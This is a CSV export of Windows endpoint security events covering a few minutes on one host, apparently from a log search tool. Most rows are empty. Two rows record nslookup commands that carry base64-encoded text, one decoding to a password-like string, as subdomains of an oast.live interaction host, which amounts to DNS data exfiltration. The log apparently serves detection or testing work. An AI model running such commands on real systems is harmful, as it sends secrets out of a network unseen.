"@timestamp","process.name","process.command_line","network.transport","source.port","dns.type","event.action"
"Jun 13, 2025 @ 21:22:49.910","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:44.627","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:39.343","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:34.059","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:28.772","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:23.490","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:18.200","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:12.908","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:07.620","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:02.335","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:57.046","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:51.763","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:50.431","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:46.474","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:41.189","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:35.896","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:30.601","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:25.315","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:20.033","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:14.751","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:09.468","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:04.187","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:58.903","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:53.621","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:48.339","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:43.054","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:37.757","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:32.471","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:27.183","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:25.673","WmiPrvSE.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:20:21.899","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:16.616","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:11.333","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:06.049","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:00.767","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:55.482","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:50.169","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:44.879","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:42.352","nslookup.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:19:41.397","nslookup.exe","""C:\Windows\system32\nslookup.exe"" cGFzc3dvcmQxMjM=.d163knb70n71ipbqb3c061ieukueeeu15.oast.live","-","-","-","Process creation"
"Jun 13, 2025 @ 21:19:39.589","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:34.305","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:29.023","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:27.358","nslookup.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:19:26.407","nslookup.exe","""C:\Windows\system32\nslookup.exe"" aGVsbG8gdGhlcmUgaSB0cnkgdGVzdGluZyA=.d163knb70n71ipbqb3c061ieukueeeu15.oast.live","-","-","-","Process creation"
"Jun 13, 2025 @ 21:19:23.738","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:18.453","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:13.170","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:07.888","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:02.601","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:57.318","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:54.325","taskhostw.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:18:53.523","taskhostw.exe","taskhostw.exe NGCKeyPregen","-","-","-","Process creation"
"Jun 13, 2025 @ 21:18:52.034","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:46.750","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:41.468","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:36.183","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:30.901","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:25.620","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:20.337","-","-","-","-","-","-"
